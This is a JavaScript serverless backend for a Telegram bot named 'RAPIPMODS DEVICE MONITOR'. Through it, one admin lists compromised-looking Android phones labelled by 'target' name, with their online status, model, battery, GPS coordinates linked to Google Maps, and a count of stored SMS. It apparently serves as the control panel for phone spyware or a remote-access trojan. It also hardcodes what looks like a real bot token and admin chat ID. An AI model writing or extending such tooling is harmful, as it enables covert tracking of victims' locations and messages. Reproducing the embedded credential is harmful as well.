import { Redis } from '@upstash/redis';

// ==================== CONFIG LANGSUNG ====================
const BOT_TOKEN = '8623003156:AAFsd5zkSR48lUsptLGop1rZFUTfbU3Gkh8';  // ← Ganti token lo
const ADMIN_CHAT_ID = 7206573112;                            // ← Ganti chat ID lo

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    
    // ==================== HANDLE WEBHOOK TELEGRAM ====================
    if (req.method === 'POST') {
        try {
            const update = req.body;
            const chatId = update.message?.chat?.id;
            
            if (chatId != ADMIN_CHAT_ID) {
                await sendTelegramMessage(chatId, '⛔ Akses ditolak.');
                return res.json({ status: 'ok' });
            }
            
            if (update.message) {
                await handleMessage(update.message);
            }
            
            return res.json({ status: 'ok' });
            
        } catch (e) {
            console.error('Telegram error:', e);
            return res.status(500).json({ error: e.message });
        }
    }
    
    // ==================== SET WEBHOOK ====================
    if (req.method === 'GET') {
        try {
            const { action } = req.query;
            
            if (action === 'set_webhook') {
                const webhookUrl = `https://${req.headers.host}/api/telegram`;
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${webhookUrl}`;
                const response = await fetch(url);
                const data = await response.json();
                return res.json(data);
            }
            
            if (action === 'get_webhook') {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/getWebhookInfo`;
                const response = await fetch(url);
                const data = await response.json();
                return res.json(data);
            }
            
            return res.json({ status: 'ok', message: 'Telegram webhook ready' });
        } catch (e) {
            return res.status(500).json({ error: e.message });
        }
    }
}

// ==================== SEND MESSAGE ====================
async function sendTelegramMessage(chatId, text, options = {}) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown',
            ...options
        })
    });
}

// ==================== HANDLE MESSAGE ====================
async function handleMessage(message) {
    const chatId = message.chat.id;
    const text = message.text || '';
    
    // Command: /start
    if (text === '/start') {
        await sendTelegramMessage(chatId,
            '🎯 *RAPIPMODS DEVICE MONITOR*\n\n' +
            'Bot ini buat nampilin:\n' +
            '• Device yang terhubung\n' +
            '• Status online/offline\n' +
            '• Info device\n' +
            '• Device ID\n\n' +
            '*Command:*\n' +
            '`/devices` - List semua device\n' +
            '`/online` - Device yang online\n' +
            '`/info <device_id>` - Info device\n' +
            '`/stats` - Statistik\n' +
            '`/help` - Bantuan',
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // Command: /devices
    if (text === '/devices') {
        await showDevices(chatId);
        return;
    }
    
    // Command: /online
    if (text === '/online') {
        await showOnlineDevices(chatId);
        return;
    }
    
    // Command: /info <device_id>
    if (text.startsWith('/info ')) {
        const deviceId = text.replace('/info ', '').trim();
        await showDeviceInfo(chatId, deviceId);
        return;
    }
    
    // Command: /stats
    if (text === '/stats') {
        await showStats(chatId);
        return;
    }
    
    // Command: /help
    if (text === '/help') {
        await sendTelegramMessage(chatId,
            '📖 *HELP*\n\n' +
            '*Command:*\n' +
            '`/start` - Menu utama\n' +
            '`/devices` - List semua device\n' +
            '`/online` - Device yang online\n' +
            '`/info <id>` - Info device\n' +
            '`/stats` - Statistik\n\n' +
            '*Contoh:*\n' +
            '`/info HP-1790015002455`',
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // Default
    await sendTelegramMessage(chatId,
        '❓ Command gak dikenal. Gunakan /help untuk bantuan.'
    );
}

// ==================== SHOW DEVICES ====================
async function showDevices(chatId) {
    try {
        const keys = await redis.keys('device:*');
        
        if (keys.length === 0) {
            await sendTelegramMessage(chatId, '📭 Belum ada device terhubung.');
            return;
        }
        
        const devices = [];
        
        for (const key of keys) {
            const id = key.replace('device:', '');
            const info = await redis.hgetall(key);
            const lastPing = await redis.get(`online:${id}`);
            const online = lastPing && (Date.now() - parseInt(lastPing)) < 30000;
            
            devices.push({
                id,
                name: info.target_name || 'Unknown',
                model: info.phone_model || 'Unknown',
                installed: info.installed_at || '-',
                online,
                lastPing: lastPing ? new Date(parseInt(lastPing)).toLocaleString('id-ID') : '-'
            });
        }
        
        let text = '📱 *LIST DEVICE*\n\n';
        text += `Total: ${devices.length} device\n\n`;
        
        for (const d of devices) {
            const status = d.online ? '🟢 ONLINE' : '🔴 OFFLINE';
            text += `${status}\n`;
            text += `📱 *${d.name}*\n`;
            text += `🆔 \`${d.id}\`\n`;
            text += `📦 ${d.model}\n`;
            text += `🕐 ${d.lastPing}\n\n`;
        }
        
        await sendTelegramMessage(chatId, text);
        
    } catch (e) {
        await sendTelegramMessage(chatId, '❌ Error: ' + e.message);
    }
}

// ==================== SHOW ONLINE DEVICES ====================
async function showOnlineDevices(chatId) {
    try {
        const keys = await redis.keys('device:*');
        const onlineDevices = [];
        
        for (const key of keys) {
            const id = key.replace('device:', '');
            const lastPing = await redis.get(`online:${id}`);
            const online = lastPing && (Date.now() - parseInt(lastPing)) < 30000;
            
            if (online) {
                const info = await redis.hgetall(key);
                onlineDevices.push({
                    id,
                    name: info.target_name || 'Unknown',
                    model: info.phone_model || 'Unknown',
                    lastPing: new Date(parseInt(lastPing)).toLocaleString('id-ID')
                });
            }
        }
        
        if (onlineDevices.length === 0) {
            await sendTelegramMessage(chatId, '📭 Gak ada device yang online.');
            return;
        }
        
        let text = '🟢 *DEVICE ONLINE*\n\n';
        text += `Total: ${onlineDevices.length} device\n\n`;
        
        for (const d of onlineDevices) {
            text += `📱 *${d.name}*\n`;
            text += `🆔 \`${d.id}\`\n`;
            text += `📦 ${d.model}\n`;
            text += `🕐 ${d.lastPing}\n\n`;
        }
        
        await sendTelegramMessage(chatId, text);
        
    } catch (e) {
        await sendTelegramMessage(chatId, '❌ Error: ' + e.message);
    }
}

// ==================== SHOW DEVICE INFO ====================
async function showDeviceInfo(chatId, deviceId) {
    try {
        const info = await redis.hgetall(`device:${deviceId}`);
        
        if (!info || Object.keys(info).length === 0) {
            await sendTelegramMessage(chatId, `❌ Device \`${deviceId}\` gak ditemukan.`);
            return;
        }
        
        const lastPing = await redis.get(`online:${deviceId}`);
        const online = lastPing && (Date.now() - parseInt(lastPing)) < 30000;
        
        const deviceInfo = await redis.hgetall(`info:${deviceId}`);
        const location = await redis.hgetall(`location:${deviceId}`);
        
        let text = `📱 *DEVICE INFO*\n\n`;
        text += `🆔 ID: \`${deviceId}\`\n`;
        text += `📱 Nama: ${info.target_name || '-'}\n`;
        text += `📦 Model: ${info.phone_model || '-'}\n`;
        text += `📅 Install: ${info.installed_at ? new Date(info.installed_at).toLocaleString('id-ID') : '-'}\n`;
        text += `🔋 Status: ${online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n`;
        text += `🕐 Last Ping: ${lastPing ? new Date(parseInt(lastPing)).toLocaleString('id-ID') : '-'}\n`;
        
        if (deviceInfo && deviceInfo.model) {
            text += `\n*DEVICE DETAILS:*\n`;
            text += `📱 Model: ${deviceInfo.model}\n`;
            text += `🏢 Brand: ${deviceInfo.brand}\n`;
            text += `🤖 Android: ${deviceInfo.android}\n`;
            text += `🔋 Baterai: ${deviceInfo.battery || '?'}%\n`;
        }
        
        if (location && location.latitude) {
            text += `\n*LOKASI:*\n`;
            text += `📍 Lat: ${parseFloat(location.latitude).toFixed(6)}\n`;
            text += `📍 Lon: ${parseFloat(location.longitude).toFixed(6)}\n`;
            text += `[Buka di Maps](https://www.google.com/maps?q=${location.latitude},${location.longitude})`;
        }
        
        await sendTelegramMessage(chatId, text);
        
    } catch (e) {
        await sendTelegramMessage(chatId, '❌ Error: ' + e.message);
    }
}

// ==================== SHOW STATS ====================
async function showStats(chatId) {
    try {
        const keys = await redis.keys('device:*');
        let onlineCount = 0;
        let offlineCount = 0;
        
        for (const key of keys) {
            const id = key.replace('device:', '');
            const lastPing = await redis.get(`online:${id}`);
            const online = lastPing && (Date.now() - parseInt(lastPing)) < 30000;
            
            if (online) onlineCount++;
            else offlineCount++;
        }
        
        const smsKeys = await redis.keys('sms:*');
        
        let text = '📊 *STATISTIK*\n\n';
        text += `📱 Total Device: ${keys.length}\n`;
        text += `🟢 Online: ${onlineCount}\n`;
        text += `🔴 Offline: ${offlineCount}\n`;
        text += `📩 SMS Tersimpan: ${smsKeys.length} device\n`;
        
        await sendTelegramMessage(chatId, text);
        
    } catch (e) {
        await sendTelegramMessage(chatId, '❌ Error: ' + e.message);
    }
}
